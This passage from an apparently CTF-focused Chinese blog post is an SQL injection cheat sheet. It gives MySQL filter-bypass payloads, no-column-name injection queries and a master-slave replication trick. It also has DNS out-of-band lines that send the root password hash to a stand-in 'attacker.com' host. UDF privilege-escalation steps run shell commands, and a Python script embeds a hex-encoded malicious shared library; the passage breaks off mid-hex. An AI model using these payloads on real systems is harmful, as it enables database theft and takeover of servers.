or</h4><ol><li>双写<code>anandd、oorr</code></li><li>使用运算符代替<code>&amp;&amp;、||</code></li><li>直接拼接<code>=</code>号，如：<code>?id=1=(condition)</code></li><li>其他方法，如：<code>?id=1^(condition)</code>、<code>?id=1)xor(condition)</code></li><li>无法使用 <code>information</code>、<code>performance</code>：<code>mysql.innodb_table_stats</code> 查表名</li></ol><h4 id="union"><a href="#union" class="headerlink" title="union"></a>union</h4><ol><li>盲注：<code>&#39;and(select pass from users limit 1)=&#39;secret</code></li></ol><h4 id="select"><a href="#select" class="headerlink" title="select"></a>select</h4><ol><li><p>有文件读取权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and substr(load_file(&#x27;</span>file<span class="string">&#x27;),locate(&#x27;</span>DocumentRoot<span class="string">&#x27;,(load_file(&#x27;</span>file<span class="string">&#x27;)))+</span></span><br><span class="line"><span class="string">length(&#x27;</span>DocumentRoot<span class="string">&#x27;),10)=&#x27;</span>a<span class="string">&#x27;=&#x27;&#x27; into outfile &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>dump.txt</span><br></pre></td></tr></table></figure></li><li><p>获取列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and 列名 is not null#</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">procedure</span> analyse()#</span><br><span class="line"><span class="string">&#x27;and substr(pass,1,1)=&#x27;</span>a  <span class="comment">/*使用substr来做过滤条件*/</span></span><br></pre></td></tr></table></figure></li><li><p>handler语句代替select查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*通过handler语句查询users表的内容*/</span></span><br><span class="line">handler users <span class="keyword">open</span> <span class="keyword">as</span> yunensec; <span class="comment">/*指定数据表进行载入并将返回句柄重命名*/</span></span><br><span class="line">handler yunensec read <span class="keyword">first</span>; <span class="comment">/*读取指定表/句柄的首行数据*/</span></span><br><span class="line">handler yunensec read next; <span class="comment">/*读取指定表/句柄的下一行数据*/</span></span><br><span class="line">handler yunensec read next; <span class="comment">/*读取指定表/句柄的下一行数据*/</span></span><br><span class="line">...</span><br><span class="line">handler yunensec <span class="keyword">close</span>; <span class="comment">/*关闭句柄*/</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;and(select pass from users where id=1)=&#x27;</span>a</span><br><span class="line"><span class="string">&#x27;and(select pass from users group by id having id=1)=&#x27;</span>a</span><br><span class="line"><span class="string">&#x27;and length((select pass from users having substr(pass,1,1)=&#x27;</span>a<span class="string">&#x27;))</span></span><br></pre></td></tr></table></figure><h4 id="where"><a href="#where" class="headerlink" title="where"></a>where</h4><ol><li><code>join/left join/right join...on...</code></li></ol><h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h4><ol><li>替代表：<code>sys.x$schema_flattened_keys</code> 、<code>sys.schema_table_statistics</code></li></ol><h4 id="ascii"><a href="#ascii" class="headerlink" title="ascii"></a>ascii</h4><ol><li><code>ascii()</code> =&gt; <code>ord()</code></li></ol><h4 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h4><ol><li><code>substr()</code> =&gt; <code>mid()</code></li><li><code>left()</code> / <code>right()</code></li></ol><h4 id="as"><a href="#as" class="headerlink" title="as"></a>as</h4><ol><li><code>database()</code> =&gt; <code>schema()</code></li></ol><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><ol><li><code>case when</code></li></ol><h4 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h4><ol><li><code>group by</code></li></ol><h4 id="其他关键字"><a href="#其他关键字" class="headerlink" title="其他关键字"></a>其他关键字</h4><ol><li><p>大小写绕过</p></li><li><p>双写绕过</p><ol><li><p>使用同义函数/语句代替，如if函数可用<code>case when condition then 1 else 0 end</code>语句代替。</p></li><li><p>使用 <code>CONCAT()</code> 时，任何个参数为 null，将返回 null，推荐使用 <code>CONCAT_WS()</code>。<code>CONCAT_WS()</code>函数第一个参数表示用哪个字符间隔所查询的结果。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;a&#x27;</span> <span class="string">&#x27;d&#x27;</span> <span class="string">&#x27;mi&#x27;</span> <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> CONCAT(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;n&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> CONCAT_WS(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;n&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> GROUP_CONCAT(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;n&#x27;</span>);</span><br></pre></td></tr></table></figure></li></ol></li></ol><h4 id="括号"><a href="#括号" class="headerlink" title="括号"></a>括号</h4><ol><li>order by 大小比较盲注</li></ol><h4 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h4><ol><li><p>用<code>true</code>换<code>1</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cal</span>(<span class="params">x</span>):</span><br><span class="line">	<span class="keyword">return</span> (<span class="string">&#x27;(&#x27;</span>+<span class="string">&#x27;(true)+&#x27;</span>*x)[:-<span class="number">1</span>]+<span class="string">&#x27;)&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>替换表</p></li></ol><div class="table-container"><table><thead><tr><th style="text-align:center">代替字符</th><th style="text-align:center">数</th><th style="text-align:center">代替字符</th><th style="text-align:center">数</th><th style="text-align:center">代替字符</th><th style="text-align:center">数</th><th style="text-align:center">数</th><th style="text-align:center">代替字符</th></tr></thead><tbody><tr><td style="text-align:center">false、!pi()</td><td style="text-align:center">0</td><td style="text-align:center">ceil(pi()*pi())</td><td style="text-align:center">10</td><td style="text-align:center">A</td><td style="text-align:center">ceil((pi()+pi())*pi())</td><td style="text-align:center">20</td><td style="text-align:center">K</td></tr><tr><td style="text-align:center">true、!(!pi())</td><td style="text-align:center">1</td><td style="text-align:center">ceil(pi()*pi())+true</td><td style="text-align:center">11</td><td style="text-align:center">B</td><td style="text-align:center">ceil(ceil(pi())*version())</td><td style="text-align:center">21</td><td style="text-align:center">L</td></tr><tr><td style="text-align:center">true+true</td><td style="text-align:center">2</td><td style="text-align:center">ceil(pi()+pi()+version())</td><td style="text-align:center">12</td><td style="text-align:center">C</td><td style="text-align:center">ceil(pi()*ceil(pi()+pi()))</td><td style="text-align:center">22</td><td style="text-align:center">M</td></tr><tr><td style="text-align:center">floor(pi())、~~pi()</td><td style="text-align:center">3</td><td style="text-align:center">floor(pi()*pi()+pi())</td><td style="text-align:center">13</td><td style="text-align:center">D</td><td style="text-align:center">ceil((pi()+ceil(pi()))*pi())</td><td style="text-align:center">23</td><td style="text-align:center">N</td></tr><tr><td style="text-align:center">ceil(pi())</td><td style="text-align:center">4</td><td style="text-align:center">ceil(pi()*pi()+pi())</td><td style="text-align:center">14</td><td style="text-align:center">E</td><td style="text-align:center">ceil(pi())*ceil(version())</td><td style="text-align:center">24</td><td style="text-align:center">O</td></tr><tr><td style="text-align:center">floor(version()) //注意版本</td><td style="text-align:center">5</td><td style="text-align:center">ceil(pi()*pi()+version())</td><td style="text-align:center">15</td><td style="text-align:center">F</td><td style="text-align:center">floor(pi()*(version()+pi()))</td><td style="text-align:center">25</td><td style="text-align:center">P</td></tr><tr><td style="text-align:center">ceil(version())</td><td style="text-align:center">6</td><td style="text-align:center">floor(pi()*version())</td><td style="text-align:center">16</td><td style="text-align:center">G</td><td style="text-align:center">floor(version()*version())</td><td style="text-align:center">26</td><td style="text-align:center">Q</td></tr><tr><td style="text-align:center">ceil(pi()+pi())</td><td style="text-align:center">7</td><td style="text-align:center">ceil(pi()*version())</td><td style="text-align:center">17</td><td style="text-align:center">H</td><td style="text-align:center">ceil(version()*version())</td><td style="text-align:center">27</td><td style="text-align:center">R</td></tr><tr><td style="text-align:center">floor(version()+pi())</td><td style="text-align:center">8</td><td style="text-align:center">ceil(pi()*version())+true</td><td style="text-align:center">18</td><td style="text-align:center">I</td><td style="text-align:center">ceil(pi()*pi()*pi()-pi())</td><td style="text-align:center">28</td><td style="text-align:center">S</td></tr><tr><td style="text-align:center">floor(pi()*pi())</td><td style="text-align:center">9</td><td style="text-align:center">floor((pi()+pi())*pi())</td><td style="text-align:center">19</td><td style="text-align:center">J</td><td style="text-align:center">floor(pi()*pi()*floor(pi()))</td><td style="text-align:center">29</td><td style="text-align:center">T</td></tr></tbody></table></div><h4 id="mysql系统库"><a href="#mysql系统库" class="headerlink" title="mysql系统库"></a>mysql系统库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#查询所有非系统自带数据库、表、列</span><br><span class="line">select table_schema,table_name,column_name from information_schema.columns where table_schema not in (&#x27;sys&#x27;,&#x27;mysql&#x27;,&#x27;information_schema&#x27;,&#x27;performance_schema&#x27;)</span><br><span class="line"></span><br><span class="line">#查询指定库的表</span><br><span class="line">select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()</span><br><span class="line">select group_concat(table_name) from sys.schema_auto_increment_columns where table_schema=database()</span><br></pre></td></tr></table></figure><h4 id="sys系统库"><a href="#sys系统库" class="headerlink" title="sys系统库"></a>sys系统库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#查询所有的库：</span><br><span class="line">SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;</span><br><span class="line">SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;</span><br><span class="line"></span><br><span class="line">#查询指定库的表（若无则说明此表从未被访问）：</span><br><span class="line">SELECT table_name FROM sys.schema_table_statistics WHERE table_schema=&#x27;mspwd&#x27; GROUP BY table_name;</span><br><span class="line">SELECT table_name FROM sys.x$schema_flattened_keys WHERE table_schema=&#x27;mspwd&#x27; GROUP BY table_name;</span><br><span class="line"></span><br><span class="line">#统计所有访问过的表次数:库名,表名,访问次数</span><br><span class="line">select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by table_schema,table_name order by io desc;</span><br><span class="line"></span><br><span class="line">#查看所有正在连接的用户详细信息:连接的用户(连接的用户名,连接的ip),当前库,用户状态(Sleep就是空闲),现在在执行的sql语句,上一次执行的sql语句,已经建立连接的时间(秒)</span><br><span class="line">SELECT user,db,command,current_statement,last_statement,time FROM sys.session;</span><br><span class="line"></span><br><span class="line">#查看所有曾连接数据库的IP,总连接次数</span><br><span class="line">SELECT host,total_connections FROM sys.host_summary;</span><br><span class="line"></span><br><span class="line">#查看语句的执行记录</span><br><span class="line">SELECT * from sys.x$statement_analysis;</span><br></pre></td></tr></table></figure><h4 id="无列名注入（or-column-被过滤）"><a href="#无列名注入（or-column-被过滤）" class="headerlink" title="无列名注入（or / column 被过滤）"></a>无列名注入（or / column 被过滤）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(`2`) from (select 1,2,3 union select * from user)x;</span><br><span class="line">select `2` from (select 1,2,3 union select * from user)x limit 1,1;</span><br><span class="line">select ((select 1,&#x27;ae&#x27;,0)&gt;(select * from user));</span><br><span class="line">union all select * from (select * from users as a join users b using(id,username))c--+</span><br><span class="line">extractvalue(1,concat(0x7e,(select*from (select*from output a join output b)c)))#</span><br></pre></td></tr></table></figure><h4 id="同步表数据-主从复制"><a href="#同步表数据-主从复制" class="headerlink" title="同步表数据 - 主从复制"></a>同步表数据 - 主从复制</h4><p>查看数据库版本：<code>select version();</code></p><p>在自己vps上起一个相同版本的mariadb，修改默认配置文件 <code>vim /etc/mysql/my.cnf</code> 允许远程访问并启</p><p>用二进制日志：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">server-id = 1</span><br><span class="line">log_bin = /var/log/mysql/mariadb-bin</span><br></pre></td></tr></table></figure><p><code>service mysql restart</code></p><p>自己的vps作为主，题目环境作为从。主服务器执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE USER &#x27;atest&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;testtest&#x27;;</span><br><span class="line">grant replication slave on . to &#x27;atest&#x27;@&#x27;%&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p>使用 <code>select database(); show tables; desc game;</code> 等查询命令查看从服务器上的表结构，将从服务器上的数据库结构一比一复刻到主服务器上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE IF NOT EXISTS game_data;</span><br><span class="line">use game_data</span><br><span class="line">CREATE TABLE IF NOT EXISTS game ( round int(20) , choice varchar(256) ) ;</span><br></pre></td></tr></table></figure><p>在主服务器mysql中执行：<code>show master status;</code></p><p>记录下来 File和 Position：<code>mysql-bin.000001 1376</code></p><p>在从服务器(题目环境)执行：</p><p><code>CHANGE MASTER TO MASTER_HOST=&#39;主服务器ip&#39;, MASTER_USER=&#39;atest&#39;, MASTER_PASSWORD=&#39;testtest&#39;, MASTER_LOG_FILE=&#39;mariadb-bin.000001(记录的值)&#39;, MASTER_LOG_POS=1365(记录的值);</code></p><p>显示下面这个表示成功连接上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">start slave;</span><br><span class="line">show slave status;</span><br></pre></td></tr></table></figure><p>主服务器中执行：<code>INSERT INTO game ( round , choice ) VALUES (&#39;1&#39;, &#39;R&#39;), (&#39;2&#39;, &#39;R&#39;),(&#39;3&#39;, &#39;R&#39;), (&#39;4&#39;, &#39;R&#39;),(&#39;5&#39;, &#39;R&#39;), (&#39;6&#39;, &#39;R&#39;),(&#39;7&#39;,&#39;R&#39;), (&#39;8&#39;, &#39;R&#39;),(&#39;9&#39;, &#39;R&#39;), (&#39;10&#39;, &#39;R&#39;);</code></p><p>插入从服务器表数据成功。</p><p>参考：SYCTF 2023 - Confronting robots</p><h4 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h4><p>mysql远程连接中可以执行命令（<code>system</code> 关键字）。</p><blockquote><p>system (!) Execute a system shell command.</p></blockquote><h4 id="参考文"><a href="#参考文" class="headerlink" title="参考文"></a>参考文</h4><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7169">https://xz.aliyun.com/t/7169</a></p><p>​</p><h3 id="DNS带外注入（OOB）"><a href="#DNS带外注入（OOB）" class="headerlink" title="DNS带外注入（OOB）"></a>DNS带外注入（OOB）</h3><p>out-of-band带外数据（OOB）与inband相反，它是一种通过其他传输方式来窃取数据的技术（例如利用DNS解析协议和电子邮件）。OOB技术通常需要易受攻击的实体生成出站TCP/UDP/ICMP请求，然后允许攻击者泄露数据。OOB攻击的成功基于出口防火墙规则，即是否允许来自易受攻击的系统和外围防火墙的出站请求。而从域名服务器（DNS）中提取数据，则被认为是最隐蔽有效的方法。</p><p><strong>利用原理：</strong></p><p><img src="/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/SQL盲注21.png" alt="img"></p><p><strong>利用条件：</strong></p><p>需要Windows环境</p><p>1、DBMS中需要有可用的，能直接或间接引发DNS解析过程的子程序，即使用到UNC</p><p>2、Linux没有UNC路径，所以当处于Linux环境，不能使用该方式获取数据</p><p><strong>工具：</strong></p><p><a target="_blank" rel="noopener" href="http://www.dnslog.cn/">DNSLog.cn</a></p><p><a target="_blank" rel="noopener" href="http://ceye.io/">CEYE</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#secure_file_priv指定文件夹或为空（没有设置）（mysql&gt;5.5.53默认null，禁用导入导出）</span><br><span class="line">#查询secure_file_priv</span><br><span class="line">select @@secure_file_priv;</span><br><span class="line">select @@global.secure_file_priv;</span><br><span class="line">show variables like &quot;secure_file_priv&quot;;</span><br><span class="line"></span><br><span class="line">#注入</span><br><span class="line">SELECT LOAD_FILE(CONCAT(&#x27;\\\\&#x27;,(SELECT password FROM mysql.user WHERE user=&#x27;root&#x27; LIMIT 1),&#x27;.attacker.com\\foobar&#x27;));</span><br><span class="line">select load_file(concat(0x5c5c5c5c,(select database()),0x2E62383862306437653533326238663635333164322E642E7A6861636B2E63615C5C612E747874));</span><br></pre></td></tr></table></figure><p>​</p><h3 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h3><p>UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。当我们有读取和写入权限以后，我们就可以尝试使用UDF提权的方法，从数据库的root权限提升到系统的管理员权限。</p><p>参考：</p><p><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/#%E4%B8%89%E3%80%81MYSQL-UDF-%E6%8F%90%E6%9D%83">Mysql UDF 提权</a></p><p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">MySQL UDF提权十六进制查询</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br><span class="line"># 通常是/usr/lib/mysql/plugin/</span><br><span class="line"></span><br><span class="line">select unhex(&#x27;udf.so的十六进制&#x27;) into dumpfile</span><br><span class="line">&#x27;/usr/lib/mysql/plugin/mysqludf.so&#x27;;</span><br><span class="line"></span><br><span class="line">create function sys_eval returns string soname &#x27;mysqludf.so&#x27;;</span><br><span class="line"></span><br><span class="line">select sys_eval(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#参考脚本</span></span><br><span class="line"><span class="comment">#环境：Linux/MariaDB</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://15700a19-71aa-4c90-b3ca-b6db9d77c56d.chall.ctf.show/api/?id=&#x27;</span></span><br><span class="line">code=<span class="string">&#x27;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F